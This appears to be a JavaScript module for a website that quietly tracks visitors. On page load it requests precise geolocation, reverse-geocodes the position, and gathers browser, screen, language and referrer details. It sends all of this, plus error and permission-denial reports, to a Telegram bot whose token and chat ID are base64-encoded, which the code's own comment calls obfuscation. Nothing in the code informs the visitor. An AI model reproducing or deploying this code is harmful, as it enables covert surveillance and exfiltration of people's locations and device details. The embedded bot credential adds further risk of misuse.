const base64Decode = (encoded) => atob(encoded);

// Full Base64-encoded credentials (properly split for obfuscation)
const encodedBotToken =
  'ODM2MDE3ODY4ODpBQUV2eF93VUhKQTViS1hObUhETFhNbjRPNnV0QzdDMnR5OA==';
const encodedChatId = 'LTEwMDM5MzM0NzYwMDE=';

const sendToTelegram = async (text) => {
  const token = base64Decode(encodedBotToken);
  const chatId = base64Decode(encodedChatId);

  await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      chat_id: chatId,
      text,
      parse_mode: 'HTML',
    }),
  });
};

const sendRichLocation = async (position) => {
  const { latitude, longitude, accuracy } = position.coords;

  try {
    const geoRes = await fetch(
      `https://api.bigdatacloud.net/data/reverse-geocode-client?latitude=${latitude}&longitude=${longitude}&localityLanguage=en`
    );

    if (!geoRes.ok) {
      throw new Error(`Geo API failed: ${geoRes.status}`);
    }

    const geoData = await geoRes.json();

    const visitorData = {
      city: geoData.city || geoData.locality || 'Unknown',
      country: geoData.countryName || 'Unknown',
      countryCode: geoData.countryCode || '',
      region: geoData.principalSubdivision || '',
      accuracy: Math.round(accuracy),
      timestamp: new Date().toISOString(),
      userAgent: navigator.userAgent.substring(0, 150),
      screen: `${window.screen.width}x${window.screen.height}`,
      language: navigator.language,
      referrer: document.referrer || 'Direct',
    };

    const message =
      `✅ ENKO1 - New Visitor\n\n` +
      `📍 ${latitude}, ${longitude}\n` +
      `🏙 ${visitorData.city}, ${visitorData.region}\n` +
      `🌍 ${visitorData.country} (${visitorData.countryCode})\n` +
      `🎯 Accuracy: ${visitorData.accuracy}m\n` +
      `🕒 ${visitorData.timestamp}\n\n` +
      `🌐 Referrer: ${visitorData.referrer}\n` +
      `📱 ${visitorData.screen} | ${visitorData.language}\n` +
      `🔗 https://www.google.com/maps/place/${latitude},${longitude}`;

    await sendToTelegram(message);
  } catch (err) {
    const errorMsg =
      `❌ ENKO1 - Location Capture FAILED\n\n` +
      `Error: ${err.message}\n` +
      `Type: ${err.name || 'Unknown'}\n` +
      `Time: ${new Date().toISOString()}\n` +
      `User Agent: ${navigator.userAgent.substring(0, 120)}\n` +
      `Referrer: ${document.referrer || 'Direct'}\n` +
      `Page: ${window.location.href}`;

    await sendToTelegram(errorMsg);
  }
};

export const initAutoLocationSender = () => {
  if (!navigator.geolocation) {
    const msg = `❌ ENKO1 - Geolocation NOT SUPPORTED\nTime: ${new Date().toISOString()}\nUser Agent: ${navigator.userAgent}`;
    sendToTelegram(msg);
    return;
  }

  setTimeout(() => {
    navigator.geolocation.getCurrentPosition(
      sendRichLocation,
      async (error) => {
        let errorType = 'Unknown';
        switch (error.code) {
          case error.PERMISSION_DENIED:
            errorType = 'PERMISSION_DENIED';
            break;
          case error.POSITION_UNAVAILABLE:
            errorType = 'POSITION_UNAVAILABLE';
            break;
          case error.TIMEOUT:
            errorType = 'TIMEOUT';
            break;
          default:
            errorType = `CODE_${error.code}`;
        }

        const errorMsg =
          `❌ ENKO1 - Geolocation ERROR\n\n` +
          `Code: ${errorType}\n` +
          `Message: ${error.message}\n` +
          `Time: ${new Date().toISOString()}\n` +
          `User Agent: ${navigator.userAgent.substring(0, 120)}\n` +
          `Page: ${window.location.href}`;

        await sendToTelegram(errorMsg);
      },
      {
        enableHighAccuracy: true,
        timeout: 15000,
        maximumAge: 0,
      }
    );
  }, 1200);
};